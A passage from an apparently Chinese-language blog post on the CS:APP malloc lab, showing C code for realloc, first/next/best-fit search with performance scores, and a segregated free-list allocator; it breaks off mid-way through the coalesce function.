    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;newptr;
    size_t copySize;
    
    newptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mm_malloc(size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (newptr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(oldptr));
    &lt;span style=&#34;color:#75715e&#34;&gt;// copySize = *(size_t *)((char *)oldptr - SIZE_T_SIZE);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    copySize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(newptr));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; copySize)
      copySize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
    memcpy(newptr, oldptr, copySize &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; WSIZE);
    mm_free(oldptr);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; newptr;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;书上最后留了两个函数作为例题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;place&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
    size_t origin_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE) {
        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));

        PUT(HDRP(NEXT_BLKP(bp)), PACK(origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        PUT(HDRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        PUT(FTRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;实现了三种不同的 fit 算法：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 74%
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.4585
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 44 (util) + 16 (thru) = 61 / 100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == FIRST_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; GET_ALLOC(HDRP(tmp_listp))) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
        }
        tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
}
&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 73%
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.0918
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 44 (util) + 40 (thru) = 84/100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# elif FIT_ALGO == NEXT_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_listp; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
            cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; cur_listp; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
            cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
}
&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 75%
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.4660
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 45 (util) + 16 (thru) = 61/100
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# elif FIT_ALGO == BEST_FIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;best_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    size_t best_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fffffff&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
        size_t cur_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(tmp_listp));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; size) {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
            }
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; best_size) {
                best_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_size;
                best_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
            }
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; best_listp;
}

&lt;span style=&#34;color:#75715e&#34;&gt;# endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;next fit 远高于另外两个算法&lt;/p&gt;
&lt;h3 id=&#34;分离适配&#34;&gt;分离适配&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+
| Block Size  | 00A | A: Alloc
+-+-+-+-+-+-+-+-+-+-+
|       pred        |
+-+-+-+-+-+-+-+-+-+-+
|       succ        |
+-+-+-+-+-+-+-+-+-+-+
|      Payload      |
+-+-+-+-+-+-+-+-+-+-+
|      Padding      |
+-+-+-+-+-+-+-+-+-+-+
| Block Size  | 00A | A: Alloc
+-+-+-+-+-+-+-+-+-+-+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;新增的宏定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MIN_BLOCK_SIZE 16
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute pred and succ block */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define FD(bp) (*(char**)(bp))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BK(bp) (*(char**)((bp) + WSIZE))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute pred and succ ptr address*/&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define FD_PTR(bp) ((char*)(bp))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BK_PTR(bp) ((char*)(bp + WSIZE))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define SET_FD(bp, val) (*(unsigned int*)(bp) = (unsigned int)(val))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SET_BK(bp, val) (*(unsigned int*)(bp+WSIZE) = (unsigned int)(val))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要一个新的全局变量来存储几个链表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FREE_LIST_SIZE 10
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;free_lists[FREE_LIST_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {NULL};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;操作链表的函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Following funcions was method of free_lists */&lt;/span&gt;
size_t &lt;span style=&#34;color:#a6e22e&#34;&gt;size_to_type&lt;/span&gt;(size_t size) {
    size_t x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;   (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)        ;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;)   x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)  x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;                    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;insert_node_to_free_list&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
    size_t list_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size_to_type(size);
    size_t last_head &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (size_t)free_lists[list_num];
    SET_BK(bp, last_head);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (last_head &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
        SET_FD(last_head, bp);
    }
    SET_FD(bp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    free_lists[list_num] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bp;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete_node_from_free_list&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (FD(bp) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
        SET_BK(FD(bp), BK(bp));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        free_lists[size_to_type(size)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BK(bp);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (BK(bp) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
        SET_FD(BK(bp), FD(bp));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其他函数都需要更改&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* place the block to a free block */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;place&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
    size_t origin_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
    delete_node_from_free_list(bp, origin_size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE) {
        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        size_t remain_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size;
        PUT(HDRP(NEXT_BLKP(bp)), PACK(remain_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(remain_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        insert_node_to_free_list(NEXT_BLKP(bp), remain_size);
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        PUT(HDRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        PUT(FTRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/* find a fit free block (first fit) */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
    size_t list_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size_to_type(size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_num; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; FREE_LIST_SIZE; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (free_lists[i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; free_lists[i]; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL; tmp_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BK(tmp_ptr))
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (GET_SIZE(HDRP(tmp_ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size)
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_ptr;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * coalesce - Coalesce free block next by
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;coalesce&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp) {
    size_t prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(FTRP(PREV_BLKP(bp)));
    size_t next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(HDRP(NEXT_BLKP(bp)));
    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc)
